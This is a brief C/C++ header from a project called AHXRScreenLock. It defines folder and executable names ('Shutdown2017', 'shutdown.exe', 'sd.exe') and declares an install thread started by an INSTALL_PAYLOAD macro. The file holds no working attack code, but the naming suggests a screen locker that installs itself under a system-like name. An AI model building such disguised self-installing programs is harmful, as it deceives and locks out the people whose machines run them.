/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include								<Windows.h>
#include								<string>

#define SHUTDOWN_FOLDER_NAME			"Shutdown2017"
#define SHUTDOWN_FILE_NAME				"shutdown.exe"
#define LOCKED_FILE_NAME				"sd.exe"

extern HANDLE							h_install_thread;
extern DWORD							dw_install_thread;
extern DWORD WINAPI						t_install(LPVOID lpParam);
extern std::string						getInstallPath();

#define	INSTALL_PAYLOAD()				{h_install_thread = CreateThread(0,0, t_install, 0, 0, &dw_install_thread);}